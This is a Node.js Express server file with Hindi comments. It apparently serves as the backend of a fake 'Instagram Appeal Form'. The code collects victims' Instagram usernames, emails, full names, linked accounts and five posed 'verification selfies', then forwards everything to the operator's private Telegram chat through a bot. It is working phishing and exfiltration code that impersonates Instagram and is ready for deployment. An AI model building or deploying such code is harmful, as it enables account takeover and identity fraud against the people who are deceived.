const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Environment variables (Render पर set करें)
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌ TELEGRAM_BOT_TOKEN या TELEGRAM_CHAT_ID environment variables set नहीं हैं!');
  process.exit(1); // सर्वर start ही न हो
}

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Multer setup for file uploads (selfies)
const upload = multer({ storage: multer.memoryStorage() });

// ---------- API Routes ----------

// 1. Form data submit
app.post('/api/submit-form', (req, res) => {
  const { type, username, email, fullname, alternative, relationship } = req.body;
  const message = `📋 <b>Instagram Appeal Form</b>

<b>Type:</b> ${type}
━━━━━━━━━━━━━━━━━━━━
<b>👤 Username:</b> ${username}
<b>📧 Email:</b> ${email}
<b>📝 Name:</b> ${fullname}
<b>🔗 Alt Account:</b> ${alternative || 'N/A'}
<b>👥 Relationship:</b> ${relationship}
━━━━━━━━━━━━━━━━━━━━
<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  sendTelegramMessage(message)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error(err);
      res.status(500).json({ error: 'Failed to send form' });
    });
});

// 2. Selfie upload (with pose info)
app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
  const { username, formType, poseText, poseNumber } = req.body;
  const photoBuffer = req.file.buffer;

  if (!photoBuffer) {
    return res.status(400).json({ error: 'No photo uploaded' });
  }

  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>

<b>👤 User:</b> ${username}
<b>📝 Pose:</b> ${poseText}
<b>📋 Type:</b> ${formType}
<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  sendTelegramPhoto(photoBuffer, caption)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error(err);
      res.status(500).json({ error: 'Failed to send photo' });
    });
});

// 3. Verification complete
app.post('/api/verification-complete', (req, res) => {
  const { username, email, fullname, formType } = req.body;
  const message = `✅ <b>VERIFICATION COMPLETED</b>

<b>👤 User:</b> ${username}
<b>📧 Email:</b> ${email}
<b>📝 Name:</b> ${fullname}
<b>📋 Form:</b> ${formType}
<b>📸 Photos:</b> 5/5
<b>✓ Status:</b> Ready for Review
<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  sendTelegramMessage(message)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error(err);
      res.status(500).json({ error: 'Failed to send completion' });
    });
});

// ---------- Telegram helper functions ----------
async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    })
  });
  if (!response.ok) {
    throw new Error(`Telegram error: ${response.status}`);
  }
  return response.json();
}

async function sendTelegramPhoto(buffer, caption) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', buffer, 'selfie.jpg');
  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');

  const response = await fetch(url, {
    method: 'POST',
    body: formData
  });
  if (!response.ok) {
    throw new Error(`Telegram error: ${response.status}`);
  }
  return response.json();
}

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
